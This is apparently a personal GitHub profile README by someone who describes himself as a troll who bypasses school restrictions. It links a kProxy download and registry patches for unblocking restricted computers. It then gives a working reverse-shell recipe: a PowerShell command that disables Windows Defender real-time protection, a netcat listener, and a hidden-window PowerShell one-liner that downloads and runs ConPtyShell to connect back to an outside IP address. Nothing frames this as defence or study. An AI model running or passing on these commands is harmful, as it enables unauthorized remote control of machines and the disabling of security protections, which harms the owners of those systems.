## OPstriker

### An idiot who loves to troll people...
### Also someone who loves to bypass restricted content in school  

## k-proxy

### I use this since my School blocks it..., just keep it here since its easy for me to download...

[Real Link](https://kproxy.com/downloads.jsp)

### Direct Download (GitHub) -

[Download](https://github.com/OPstriker/k-proxy/raw/56c1920e7dda8c4d18de3910a475221c12b8f363/kproxyagent_windows.zip)

### Chrome Extension -

[Link](https://chrome.google.com/webstore/detail/kproxy-extension/gdocgbfmddcfnlnpmnghmjicjognhonm)

## Registry Files -

### Some Regesitry file's to enable Blocked Stuff on Restricted Computers -

[Download](https://github.com/OPstriker/Regedit-Patches/raw/9138caa88a98c2614286e7fa9d7865706a6d43d8/Registry%20Patches.zip)

## ReverseShell (PowerShell) -

### Disable Windows Realtime Protection -
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
### Listener -
```
sudo stty raw -echo; (stty size; cat) | nc -lvnp 443
```
### Client -
```
powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
```
